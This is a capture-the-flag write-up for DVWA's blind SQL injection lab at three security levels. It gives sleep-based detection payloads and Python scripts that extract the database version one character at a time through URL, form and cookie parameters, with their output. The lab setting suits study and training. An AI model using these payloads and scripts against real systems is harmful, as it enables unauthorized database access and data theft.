---
title: "SQL Injection (Blind) - DVWA"
description: ""
summary: "Perform a blind SQL injection attack to retrieve the database version."
date: 2022-08-17
draft: false
author: "Aftab Sama" # ["Me", "You"] # multiple authors
tags: ["writeups", "challenge", "DVWA", "Blind SQL Injection"]
canonicalURL: ""
showToc: true
TocOpen: false
TocSide: 'right'  # or 'left'
weight: 7
# aliases: ["/first"]
hidemeta: false
comments: false
disableHLJS: true # to disable highlightjs
disableShare: true
hideSummary: false
searchHidden: false
ShowReadingTime: true
ShowBreadCrumbs: true
ShowPostNavLinks: true
ShowWordCount: true
ShowRssButtonInSectionTermList: true
# UseHugoToc: true
# cover:
#     image: "<image path/url>" # image path/url
#     alt: "<alt text>" # alt text
#     caption: "<text>" # display caption under cover
#     relative: false # when using page bundles set this to true
#     hidden: true # only hide on current single page
# editPost:
#     URL: "https://github.com/"
#     Text: "Suggest Changes" # edit text
#     appendFilePath: true # to append file path to Edit link
---


### **Security level: low**

Payload to detect vulnerability: `1' and sleep(5)#` it is taking 5 to response.

Python code to brute force version:

```python
import requests
from requests.structures import CaseInsensitiveDict

headers = CaseInsensitiveDict()
headers["Cookie"] = "security=low; PHPSESSID=to84ds41bhba7ub48s10a8qim0"
url = 'http://192.168.170.131/vulnerabilities/sqli_blind/'

for i in range(100):
    parameters = f"id=1'+and+length(version())%3d{i}%23&Submit=Submit"
    r = requests.get(url, headers=headers, params=parameters)
    if 'User ID exists in the database' in r.text:
        print(f'length = {i}')
        length = i
        break
j = 1
for i in range(1, length+1):
    for s in range(30, 126):
        parameters = f"id=1'+and+ascii(substring(version(),{i},{j}))%3d{s}%23&Submit=Submit"
        r = requests.get(url, headers=headers, params=parameters)
        if 'User ID exists in the database' in r.text:
            print(chr(s), end='')
            break
        j += 1

```

Output:
  
```Shell
length = 24
10.1.26-MariaDB-0+deb9u1
Process finished with exit code 0
```


### **Security level: medium**

Payload to detect vulnerability: `1 and sleep(5)` it is taking 5 to response.


Python code to brute force version:
  
```python
import requests
from requests.structures import CaseInsensitiveDict

headers = CaseInsensitiveDict()
headers["Cookie"] = "security=medium; PHPSESSID=to84ds41bhba7ub48s10a8qim0"
headers["Content-Type"] = "application/x-www-form-urlencoded"
url = 'http://192.168.170.131/vulnerabilities/sqli_blind/'

for i in range(100):
    parameters = f"id=1+and+length(version())={i}&Submit=Submit"
    # parameters = {"id": f'1+and+length(version())={i}', "Submit": "Submit"}
    r = requests.post(url, headers=headers, data=parameters)
    if 'User ID exists in the database' in r.text:
        print(f'length = {i}')
        length = i
        break
j = 1
for i in range(1, length+1):
    for s in range(30, 126):
        parameters = f"id=1+and+ascii(substring(version(),{i},{j}))={s}&Submit=Submit"
        r = requests.post(url, headers=headers, data=parameters)
        if 'User ID exists in the database' in r.text:
            print(chr(s), end='')
            break
        j += 1

```

Output:
  
```shell
length = 24
10.1.26-MariaDB-0+deb9u1
Process finished with exit code 0
```


### **Security level: high**

Payload to detect vulnerability: `1' and sleep(5)#` it is taking 5 to response.


Python code to brute force version:
  
```python
import requests
from requests.structures import CaseInsensitiveDict

headers = CaseInsensitiveDict()
headers["Cookie"] = "id=1%27+and+length%28version%28%29%29%3E0%23; security=high; PHPSESSID=to84ds41bhba7ub48s10a8qim0"
url = 'http://192.168.170.131/vulnerabilities/sqli_blind/'

for i in range(100):
    headers["Cookie"] = f"id=1'+and+length(version())%3d{i}%23; security=high; PHPSESSID=to84ds41bhba7ub48s10a8qim0"
    r = requests.get(url, headers=headers)
    if 'User ID exists in the database' in r.text:
        print(f'length = {i}')
        length = i
        break
j = 1
for i in range(1, length+1):
    for s in range(30, 126):
        headers["Cookie"] = f"id=1'+and+ascii(substring(version(),{i},{j}))%3d{s}%23; security=high; PHPSESSID=to84ds41bhba7ub48s10a8qim0"
        r = requests.get(url, headers=headers)
        if 'User ID exists in the database' in r.text:
            print(chr(s), end='')
            break
        j += 1

```


Output:
  
```shell
length = 24
10.1.26-MariaDB-0+deb9u1
Process finished with exit code 0
```

Happy Hacking
